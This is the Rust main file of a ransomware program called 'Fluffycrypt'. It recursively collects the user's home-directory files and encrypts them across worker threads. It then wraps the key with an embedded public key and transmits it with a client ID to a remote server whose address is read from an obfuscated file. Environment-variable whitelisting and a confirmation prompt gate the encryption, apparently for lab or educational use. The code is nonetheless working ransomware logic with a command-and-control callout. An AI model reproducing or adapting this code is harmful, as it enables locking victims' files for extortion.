use comms::{generate_ucid, Message};
use encryptor::wrap_key;
use filesystem::recurse_directory_with_channel;
use obfuscation::get_ip;
use std::env;
use std::io;
use std::process::exit;
use std::thread::sleep;
use std::time::Duration;
use std::vec::Vec;
use tokio::net::TcpSocket;
use tracing::{self, event, Level};
use tracing_subscriber::fmt::Subscriber;

use zeroize::Zeroize;

mod comms;
mod encryptor;
mod filesystem;
mod obfuscation;

const THREADS: i32 = 8;

#[allow(dead_code)]
#[cfg(unix)]
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[allow(dead_code)]
#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

#[allow(dead_code)]
#[cfg(unix)]
const SERVER_IP: &[u8] = include_bytes!("../ip-port.bin");

#[allow(dead_code)]
#[cfg(windows)]
const SERVER_IP: &[u8] = include_bytes!("..\\ip-port.bin");

#[tokio::main]
async fn main() {
    // set up monitor
    let mut disable_cryptography = false;
    let mut builder = Subscriber::builder();
    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
        builder = builder.with_max_level(Level::DEBUG);
    }
    builder = builder.with_thread_ids(true);
    let subscriber = builder.finish();
    tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
    event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");

    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
        event!(
            Level::WARN,
            "This host is a development environment, cryptographic operations will not be performed!"
        );
        disable_cryptography = true;
    }

    if Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_DEV")
        && Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_ALLOW_TARGET")
    {
        // if not development and not allowed
        event!(
            Level::ERROR,
            "This host has not been whitelisted. Fluffycrypt will now exit!"
        );
        exit(1);
    } else if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV")
        && Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_ALLOW_TARGET")
    {
        // if development and allowed
        event!(
            Level::WARN,
            "This host has been whitelisted and has noted itself as a development system. Cryptographic operations have been re-enabled."
        );
        disable_cryptography = false;
    }

    if !disable_cryptography {
        println!("Are you sure you'd like to nuke this system? ");
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        if input.to_lowercase() != String::from("yes") {
            disable_cryptography = true;
            event!(
                Level::WARN,
                "Cryptography disabled per user input. System will still perform all stages except the encryption stage."
            );
        }
    }

    let mut key = encryptor::generate_key();
    let (s, r) = crossbeam_channel::unbounded();

    event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);

    if !disable_cryptography {
        let mut threads = Vec::new();

        event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
        for _ in 0..THREADS {
            // start workers
            let thread_reciever = r.clone();
            let thread_key = key.clone();
            threads.push(tokio::spawn(async move {
                encryptor::encrypt_files(thread_reciever, thread_key).await;
            }));
        }

        for thread in threads {
            let _ = thread.await;
        }
    } else {
        event!(Level::INFO, "-- SKIPPED STAGE: Worker Start --");
    }

    event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
    let encrypted_key = wrap_key(&key);

    let mut ucid = generate_ucid().unwrap();

    let ip = get_ip();

    key.zeroize(); // zero out key, not needed anymore

    event!(Level::INFO, "-- REACHED STAGE: Networking --");
    let mut register_blob =
        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();

    let addr = ip.parse().unwrap();

    // set up networking primitives
    let socket = TcpSocket::new_v4().unwrap();
    let mut stream = socket.connect(addr).await.unwrap();
    let mut read_buff = vec![0; 1024];

    event!(Level::DEBUG, "-- REACHED STAGE: Transmission Start --");
    loop {
        event!(Level::DEBUG, "Waiting for stream to become writable...");
        if stream.writable().await.is_ok() {
            event!(Level::DEBUG, "Stream is writable, transmitting!");
            // transmit registration request
            let len = stream.try_write(&register_blob);
            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::DEBUG, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }
        }

        event!(Level::DEBUG, "Waiting for stream to become readable...");
        if stream.readable().await.is_ok() {
            event!(Level::DEBUG, "Stream is readable, reading!");
            let len = stream.try_read(&mut read_buff);

            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::INFO, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }

            let len = len.unwrap(); // len is valid, it's safe to unwrap

            match Message::from_req(&mut read_buff[0..len]) {
                Message::UcidReject(_) => {
                    event!(
                        Level::WARN,
                        "UCID rejected by server. Generating a new one and retrying immediately."
                    );
                    ucid = generate_ucid().unwrap();
                    register_blob =
                        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
                }
                Message::RateReject() => {
                    event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                    sleep(Duration::from_secs(31));
                    let socket = TcpSocket::new_v4().unwrap();
                    event!(Level::DEBUG, "Reconnecting to server...");
                    stream = socket.connect(addr).await.unwrap();
                    continue;
                }
                Message::Accepted(_) => {
                    // registration accepted, no need to retry
                    event!(
                        Level::INFO,
                        "Transmission Successful. Client ID is: {}. This application will now exit.",
                        ucid
                    );
                    break;
                }
                _ => {
                    continue;
                }
            }
        }
    }
}
